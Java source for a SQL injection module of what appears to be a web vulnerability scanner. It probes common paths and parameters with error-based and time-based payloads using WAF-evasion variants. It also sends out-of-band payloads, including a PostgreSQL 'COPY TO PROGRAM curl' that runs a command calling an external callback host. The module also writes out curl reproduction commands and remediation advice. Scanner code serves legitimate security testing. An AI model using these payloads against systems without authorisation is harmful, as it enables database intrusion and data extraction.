package gg.effront.anarcry.scanner.web.sqli;

import gg.effront.anarcry.model.CvssCalculator;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.KnowledgeBase;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.oast.OastCorrelator;
import gg.effront.anarcry.scanner.oast.OastPayload;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.CircuitBreakerException;
import gg.effront.anarcry.scanner.util.HttpClientFactory;
import gg.effront.anarcry.scanner.util.ProbeExecutor;
import gg.effront.anarcry.scanner.util.WafEvasion;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Callable;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SqlInjectionModule implements Scanner {

    private static final List<String> PATHS = List.of("/search", "/api/search", "/login", "/api/users", "/api/items",
            "/api/", "/api/v1/");

    private static final List<String> PARAMS = List.of("q", "query", "id", "user", "username", "email", "search",
            "sort", "order", "filter", "page");

    // High-signal subset for WAF-detected targets
    private static final List<String> WAF_PARAMS = List.of("q", "id", "username", "search", "filter");

    // Phase 1 -- error-based payloads
    private static final List<String> ERROR_PAYLOADS = List.of("'", "\"", "')", "' AND 1=1--", "' AND 1=2--");

    // Phase 2 -- time-based payloads (each should induce ~5s delay on a vulnerable
    // DB)
    private record TimePayload(String payload, String dbHint) {
    }

    private static final List<TimePayload> TIME_PAYLOADS = List.of(new TimePayload("' AND SLEEP(5)--", "MySQL"),
            new TimePayload("'; SELECT pg_sleep(5)--", "PostgreSQL"),
            new TimePayload("'; WAITFOR DELAY '0:0:5'--", "MSSQL"));

    private record BaselineProbe(int statusCode, String body, long rttMs) {
    }

    private record TimeProbeResult(long elapsedMs, String body, int statusCode) {
    }

    // Multi-vendor SQL error signature -- requires at least one specific token to
    // avoid
    // false positives from generic "error" or "invalid" application messages.
    private static final Pattern SQL_ERROR = Pattern.compile(
            "SQL syntax|mysql_fetch|ORA-\\d{4,}|Microsoft SQL|pg_query|SQLite"
                    + "|unclosed quotation|quoted string not properly terminated|You have an error in your SQL",
            Pattern.CASE_INSENSITIVE);

    @Override
    public String id() {
        return "SQLi";
    }

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        String cweId = CweRegistry.cweId(id());
        String cweTitle = CweRegistry.cweTitle(id());
        String cvssVec = CweRegistry.cvssVector(id());
        double cvssScore = CvssCalculator.calculate(cvssVec);

        List<Finding> findings = new ArrayList<>();
        HttpClient hc = HttpClientFactory.http2();

        String scheme = ctx.isHttps() ? "https" : "http";
        int defPort = ctx.isHttps() ? 443 : 80;
        String base = scheme + "://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "");

        List<String> errorPayloads = mergeKbErrorPayloads();
        log.accept("[~] SQLi: iniciando em " + base + " (" + PATHS.size() + " paths, " + errorPayloads.size()
                + " error payloads)");

        AtomicBoolean cancel = new AtomicBoolean(false);
        List<Callable<List<Finding>>> tasks = new ArrayList<>();

        for (int pi = 0; pi < PATHS.size(); pi++) {
            final String path = PATHS.get(pi);
            final int pathIdx = pi;
            tasks.add(() -> {
                List<Finding> local = new ArrayList<>();
                boolean waf = ctx.wafState().isWafDetected();
                boolean noTimeBased = waf || ctx.wafState().browserTransport() != null;
                List<String> effectiveParams = waf ? WAF_PARAMS : PARAMS;
                log.accept("[~] SQLi: [" + (pathIdx + 1) + "/" + PATHS.size() + "] " + path + " -- "
                        + effectiveParams.size() + " params" + (waf ? " (WAF mode)" : ""));
                if (noTimeBased && pathIdx == 0) {
                    log.accept("[~] SQLi: time-based phase desabilitada"
                            + (waf ? " (WAF mode)" : " -- BrowserTransport ativo"));
                }
                for (String param : effectiveParams) {
                    if (cancel.get()) {
                        return local;
                    }

                    // -- Phase 1: Error-Based --
                    String baselineBody = fetchBody(ctx, hc, base + path + "?" + param + "=test", log);
                    // Anti-FP: skip if baseline itself already contains SQL error tokens
                    if (SQL_ERROR.matcher(baselineBody).find()) {
                        log.accept("[~] SQLi: baseline ja contem SQL error em " + path + " -- pulando param " + param);
                        continue;
                    }

                    for (String payload : errorPayloads) {
                        if (cancel.get()) {
                            return local;
                        }
                        List<String> variants = WafEvasion.bypassPayloads(ctx, payload);
                        String encoded = URLEncoder.encode(variants.getFirst(), "UTF-8");
                        String url = base + path + "?" + param + "=" + encoded;
                        try {
                            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url))
                                    .timeout(Duration.ofSeconds(6)).GET().build();
                            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(),
                                    id());
                            String body = resp.body() != null ? resp.body() : "";

                            Matcher m = SQL_ERROR.matcher(body);
                            if (m.find() && resp.statusCode() != 400) {
                                String match = m.group();
                                String endpoint = path + "?" + param + "=" + encoded;
                                log.accept("[!!] SQLi error-based CRITICAL em " + endpoint + " -- match: " + match);

                                local.add(Finding.of(id(), endpoint, "SQL Injection -- Error-Based confirmado",
                                        Severity.CRITICAL,
                                        "Payload: " + payload + " | Match: " + match + " | Status: " + resp.statusCode()
                                                + " | URL: " + base + endpoint,
                                        "SQL Injection error-based expoe mensagem de erro interno do banco de "
                                                + "dados, permitindo enumeracao de estrutura e extracao de dados.",
                                        "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param + "="
                                                + payload + "'",
                                        "Use prepared statements / parameterized queries em todos os pontos de "
                                                + "entrada. Nunca concatene input do usuario em queries SQL. "
                                                + "Desabilite mensagens de erro detalhadas do banco em producao.",
                                        cweId, cweTitle, cvssVec, cvssScore));
                                cancel.set(true);
                                return local;
                            }
                        } catch (CircuitBreakerException cbe) {
                            throw cbe;
                        } catch (Exception ignored) {
                        }
                    }

                    if (cancel.get()) {
                        return local;
                    }

                    // -- Phase 2: Time-Based Blind --
                    if (noTimeBased) {
                        injectOobSqli(ctx, hc, base, path, param, log);
                        return local;
                    }

                    BaselineProbe bl1 = probeBaseline(ctx, hc, base + path + "?" + param + "=1");
                    BaselineProbe bl2 = probeBaseline(ctx, hc, base + path + "?" + param + "=2");
                    if (bl1.rttMs < 0 && bl2.rttMs < 0) {
                        continue;
                    }

                    boolean skip404 = (bl1.statusCode == 404 || bl1.statusCode == 410)
                            && (bl2.statusCode == 404 || bl2.statusCode == 410);
                    boolean skipEmpty = bl1.body.isBlank() && bl2.body.isBlank();
                    if (skip404 || skipEmpty) {
                        log.accept("[~] SQLi: baseline " + (skip404 ? bl1.statusCode : "body vazio") + " em " + path
                                + " -- pulando time-based para " + param);
                        injectOobSqli(ctx, hc, base, path, param, log);
                        continue;
                    }

                    long baselineAvg = bl1.rttMs < 0
                            ? bl2.rttMs
                            : bl2.rttMs < 0 ? bl1.rttMs : (bl1.rttMs + bl2.rttMs) / 2;

                    List<String> spikedEngines = new ArrayList<>();
                    Map<String, Long> spikedDeltas = new LinkedHashMap<>();
                    Map<String, TimePayload> spikedTps = new LinkedHashMap<>();

                    for (TimePayload tp : TIME_PAYLOADS) {
                        if (cancel.get()) {
                            return local;
                        }
                        String encoded = URLEncoder.encode(WafEvasion.evasionPayload(ctx, tp.payload()), "UTF-8");
                        String url = base + path + "?" + param + "=" + encoded;
                        TimeProbeResult pr = probeTimeBased(ctx, hc, url);
                        if (pr.elapsedMs < 0) {
                            continue;
                        }
                        // Reject spikes where the server responded with an empty body --
                        // the endpoint is not processing input. Timeouts (statusCode -1)
                        // are exempt because the body is empty only due to the timeout.
                        if (pr.statusCode > 0 && pr.body.isBlank()) {
                            continue;
                        }
                        if (pr.elapsedMs > baselineAvg + 4000) {
                            spikedEngines.add(tp.dbHint());
                            spikedDeltas.put(tp.dbHint(), pr.elapsedMs - baselineAvg);
                            spikedTps.put(tp.dbHint(), tp);
                        }
                    }

                    // Multi-DB inconsistency: no real server speaks 2+ SQL dialects
                    if (spikedEngines.size() >= 2) {
                        log.accept("[~] SQLi: " + spikedEngines.size() + " DB engines spiked ("
                                + String.join(", ", spikedEngines) + ") em " + path + "?" + param
                                + " -- inconsistencia multi-DB, descartando como FP");
                        injectOobSqli(ctx, hc, base, path, param, log);
                        continue;
                    }

                    if (spikedEngines.size() == 1) {
                        String engine = spikedEngines.getFirst();
                        TimePayload tp = spikedTps.get(engine);
                        long attackDelta = spikedDeltas.get(engine);
                        long attackElapsed = attackDelta + baselineAvg;

                        boolean confirmed = verifyProportionalSqlDelay(ctx, hc, baselineAvg, attackDelta, base, path,
                                param, tp, log);
                        if (confirmed) {
                            String encoded = URLEncoder.encode(WafEvasion.evasionPayload(ctx, tp.payload()), "UTF-8");
                            String endpoint = path + "?" + param + "=" + encoded;
                            log.accept("[!!] SQLi time-based CRITICAL -- " + tp.dbHint() + " em " + endpoint
                                    + " baseline=" + baselineAvg + "ms attack=" + attackElapsed
                                    + "ms (proporcional confirmado)");

                            local.add(Finding.of(id(), endpoint,
                                    "SQL Injection -- Time-Based Blind confirmado (" + tp.dbHint() + ")",
                                    Severity.CRITICAL,
                                    "baseline=" + baselineAvg + "ms attack=" + attackElapsed + "ms delta=" + attackDelta
                                            + "ms | Verificacao proporcional:" + " confirmada | DB hint: " + tp.dbHint()
                                            + " | Payload: " + tp.payload(),
                                    "Blind SQL Injection confirmado por delay" + " proporcional de " + attackDelta
                                            + "ms acima do baseline. Permite" + " extracao de dados via inferencia"
                                            + " booleana / temporal mesmo sem" + " mensagens de erro visiveis.",
                                    "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param + "="
                                            + tp.payload() + "'",
                                    "Use prepared statements / parameterized" + " queries. Implemente WAF com"
                                            + " deteccao de time-based blind" + " SQLi. Limite o timeout de"
                                            + " queries no banco.",
                                    cweId, cweTitle, cvssVec, cvssScore));
                            cancel.set(true);
                            return local;
                        } else {
                            log.accept("[~] SQLi: spike temporal em " + path + "?" + param + " (" + engine + ", delta="
                                    + attackDelta + "ms) -- verificacao" + " proporcional falhou, descartando");
                        }
                    }

                    // Phase 3: OOB DNS exfiltration via OAST (complement to time-based)
                    injectOobSqli(ctx, hc, base, path, param, log);
                }
                return local;
            });
        }

        findings.addAll(ProbeExecutor.run(tasks, ctx.config().probeConcurrency(), cancel));

        if (findings.isEmpty()) {
            log.accept("[+] SQLi: nenhuma injecao SQL detectada");
        }
        return findings;
    }

    // ── helpers ────────────────────────────────────────────────────────────────

    private String fetchBody(ScanContext ctx, HttpClient hc, String url, Consumer<String> log) {
        try {
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET()
                    .build();
            HttpResponse<String> r = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            return r.body() != null ? r.body() : "";
        } catch (Exception e) {
            return "";
        }
    }

    private static final Pattern TIME_BASED_KEYWORD = Pattern.compile("(?i)sleep|pg_sleep|waitfor|benchmark|delay");

    private List<String> mergeKbErrorPayloads() {
        LinkedHashSet<String> merged = new LinkedHashSet<>(ERROR_PAYLOADS);
        for (String kbp : KnowledgeBase.getInstance().filteredPayloads(id())) {
            if (!TIME_BASED_KEYWORD.matcher(kbp).find()) {
                merged.add(kbp);
            }
        }
        return List.copyOf(merged);
    }

    /**
     * Inject OOB DNS exfiltration payloads via OAST for blind SQLi detection. These
     * DB-specific payloads trigger DNS/HTTP lookups to the OAST callback server:
     *
     * <ul>
     * <li>MySQL: {@code LOAD_FILE('\\\\<callback>\\\\<id>')} -- UNC path triggers
     * DNS lookup
     * <li>MSSQL: {@code xp_dirtree '\\\\<callback>\\<id>'} -- directory listing
     * triggers DNS
     * <li>PostgreSQL: {@code COPY ... FROM PROGRAM 'curl <callback>/<id>'} -- HTTP
     * callback
     * </ul>
     */
    private void injectOobSqli(ScanContext ctx, HttpClient hc, String base, String path, String param,
            Consumer<String> log) {
        OastCorrelator oast = ctx.oastCorrelator();
        if (oast == null || oast.callbackBaseUrl().isEmpty()) {
            return;
        }
        // Extract host:port from callback base URL for UNC-style payloads
        String cbBase = oast.callbackBaseUrl();
        String cbHost = cbBase.replaceFirst("^https?://", "").replaceFirst("/.*$", "");

        // MySQL: LOAD_FILE with UNC path
        String mysqlId = OastCorrelator.generatePayloadId();
        String mysqlPayload = "' AND LOAD_FILE('\\\\\\\\" + cbHost + "\\\\\\\\" + mysqlId + "')-- ";
        injectOobPayload(ctx, hc, oast, base, path, param, mysqlId, mysqlPayload, "MySQL-OOB", log);

        // MSSQL: xp_dirtree with UNC path
        String mssqlId = OastCorrelator.generatePayloadId();
        String mssqlPayload = "'; EXEC xp_dirtree '\\\\\\\\" + cbHost + "\\\\" + mssqlId + "'-- ";
        injectOobPayload(ctx, hc, oast, base, path, param, mssqlId, mssqlPayload, "MSSQL-OOB", log);

        // PostgreSQL: COPY FROM PROGRAM with curl
        String pgId = OastCorrelator.generatePayloadId();
        String pgPayload = "'; COPY (SELECT 1) TO PROGRAM 'curl " + oast.callbackUrl(pgId) + "'-- ";
        injectOobPayload(ctx, hc, oast, base, path, param, pgId, pgPayload, "PostgreSQL-OOB", log);
    }

    private void injectOobPayload(ScanContext ctx, HttpClient hc, OastCorrelator oast, String base, String path,
            String param, String payloadId, String payload, String label, Consumer<String> log) {
        try {
            oast.registerPayload(
                    new OastPayload(payloadId, id(), path + "?" + param, param, payload, System.currentTimeMillis()));
            String encoded = URLEncoder.encode(payload, "UTF-8");
            String url = base + path + "?" + param + "=" + encoded;
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET()
                    .build();
            Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), id());
            log.accept("[~] SQLi: OOB payload " + label + " injetado em " + path + "?" + param);
        } catch (Exception e) {
            // OOB injection errors are non-fatal
        }
    }

    private BaselineProbe probeBaseline(ScanContext ctx, HttpClient hc, String url) {
        try {
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET()
                    .build();
            long t0 = System.currentTimeMillis();
            HttpResponse<String> r = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            long rtt = System.currentTimeMillis() - t0;
            return new BaselineProbe(r.statusCode(), r.body() != null ? r.body() : "", rtt);
        } catch (java.net.http.HttpTimeoutException e) {
            return new BaselineProbe(-1, "", 6_000L);
        } catch (CircuitBreakerException cbe) {
            throw cbe;
        } catch (Exception e) {
            return new BaselineProbe(-1, "", -1L);
        }
    }

    private TimeProbeResult probeTimeBased(ScanContext ctx, HttpClient hc, String url) {
        try {
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(10)).GET()
                    .build();
            long start = System.currentTimeMillis();
            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            long elapsed = System.currentTimeMillis() - start;
            return new TimeProbeResult(elapsed, resp.body() != null ? resp.body() : "", resp.statusCode());
        } catch (java.net.http.HttpTimeoutException toe) {
            return new TimeProbeResult(10_000L, "", -1);
        } catch (CircuitBreakerException cbe) {
            throw cbe;
        } catch (Exception e) {
            return new TimeProbeResult(-1L, "", -1);
        }
    }

    /**
     * Proportional verification: if SLEEP(5) caused delta D above baseline, a
     * SLEEP(1) probe must produce ~D/5 above baseline within 40% tolerance. This
     * eliminates network jitter that coincidentally exceeds the threshold.
     */
    private boolean verifyProportionalSqlDelay(ScanContext ctx, HttpClient hc, long baselineAvg, long attackDelta,
            String base, String path, String param, TimePayload tp, Consumer<String> log) {
        String shortPayload = shortSleepPayload(tp);
        if (shortPayload == null) {
            return false;
        }
        try {
            String encoded = URLEncoder.encode(WafEvasion.evasionPayload(ctx, shortPayload), "UTF-8");
            String url = base + path + "?" + param + "=" + encoded;
            TimeProbeResult pr = probeTimeBased(ctx, hc, url);
            if (pr.elapsedMs < 0) {
                return false;
            }

            long shortDelta = pr.elapsedMs - baselineAvg;
            long expectedDelta = attackDelta / 5;
            long tolerance = (long) (expectedDelta * 0.4);
            long lowerBound = expectedDelta - tolerance;
            long upperBound = expectedDelta + tolerance;

            log.accept("[~] SQLi: proporcional " + tp.dbHint() + " -- SLEEP(1) delta=" + shortDelta + "ms expected="
                    + expectedDelta + "ms range=[" + lowerBound + "," + upperBound + "]");

            return shortDelta >= lowerBound && shortDelta <= upperBound;
        } catch (Exception e) {
            return false;
        }
    }

    private static String shortSleepPayload(TimePayload tp) {
        return switch (tp.dbHint()) {
            case "MySQL" -> "' AND SLEEP(1)--";
            case "PostgreSQL" -> "'; SELECT pg_sleep(1)--";
            case "MSSQL" -> "'; WAITFOR DELAY '0:0:1'--";
            default -> null;
        };
    }
}
